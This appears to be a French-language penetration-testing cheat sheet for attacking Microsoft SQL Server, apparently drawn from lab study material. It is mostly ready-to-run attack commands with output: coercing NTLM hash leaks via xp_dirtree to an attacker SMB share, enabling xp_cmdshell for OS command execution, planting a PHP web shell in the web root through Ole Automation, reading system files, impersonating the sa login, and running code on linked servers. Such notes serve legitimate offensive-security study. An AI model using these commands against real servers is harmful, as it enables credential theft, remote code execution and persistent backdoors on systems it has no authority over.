**Intégré** avec l'écosystème Windows
Protocole Tabular Data Stream (TDS)

# Authentification
Windows authentication mode: utilise les utilisateurs et groupes Windows marquez sûr
Mixed mode: Comme WAM mais a aussi des usagers locaux au serveur SQL

# Obtention du hash d'une compte
Utilise un hash comme SMB. Possible de créer une connexion SMB avec **xp_subdirs** ou **xp_dirtree**. Utiliser Responder comme serveur
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
EXEC master..xp_dirtree '\\10.10.110.17\share\'
EXEC master..xp_subdirs '\\10.10.110.17\share\'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Info système
| info | commande |
| --- | --- |
| Version| ```SELECT @@version;``` |
| Bases de données | 	```SELECT name FROM sys.databases;``` | 
| Tables d'une base de données |  	```SELECT * FROM [nom_bd].information_schema.tables;``` | 

# Outils
## SQLCMD
Outil ligne de commandes ou gestion à distance
## impacket-mssqlclient
implémente TDS, connection à distance.
Utiliser -windows-auth pour forcer NTLM
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


# Bases de données par défaut
| Default System Database |	Description |
| --- | --- |
| master |	Tracks all system information for an SQL server instance |
| model | 		Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database | 
| msdb 	| 	The SQL Server Agent uses this database to schedule jobs & alerts | 
| tempdb | 	Stores temporary objects |  
| resource |  	Read-only database containing system objects included with SQL server | 
	
# Exécution de code
xp_cmdshell envoi du code au shell sous-jacent
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SQL> EXECUTE sp_configure 'show advanced options', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
SQL> EXECUTE sp_configure 'xp_cmdshell', 1;
[*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> RECONFIGURE;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
SQL> EXECUTE xp_cmdshell 'whoami';
output
--------------------------------------------------------------------------------------------
nt service\mssql$sqlexpress
NULL
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

# Écriture de fichiers
besoin d'être admin et activer Ole Automation Procedure

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
sp_configure 'show advanced options', 1
RECONFIGURE
sp_configure 'Ole Automation Procedures', 1
RECONFIGURE

DECLARE @OLE INT
DECLARE @FileID INT
EXECUTE sp_OACreate 'Scripting.FileSystemObject', @OLE OUT
EXECUTE sp_OAMethod @OLE, 'OpenTextFile', @FileID OUT, 'c:\inetpub\wwwroot\webshell.php', 8, 1
EXECUTE sp_OAMethod @FileID, 'WriteLine', Null, '<?php echo shell_exec($_GET["c"]);?>'
EXECUTE sp_OADestroy @FileID
EXECUTE sp_OADestroy @OLE
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Lecture de fichiers
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~sql
SELECT * FROM OPENROWSET(BULK N'C:/Windows/System32/drivers/etc/hosts', SINGLE_CLOB) AS Contents
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Usurpation d'utilisateurs
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sql
--Voir qui on peut usurper
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
--Voir usager courant et rôle
SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
--Usurper (faire dans BD master puisque tout le monde y a accès)
EXECUTE AS LOGIN = 'sa' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
# Serveurs liés
Peut exécuter du code sur un autre serveur, distant ou pas. Note usager pourrais avoir des droits de plus dessus.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ sql
--découverte
SELECT srvname, isremote FROM sysservers
--exécution de code (obtention des droits)
EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
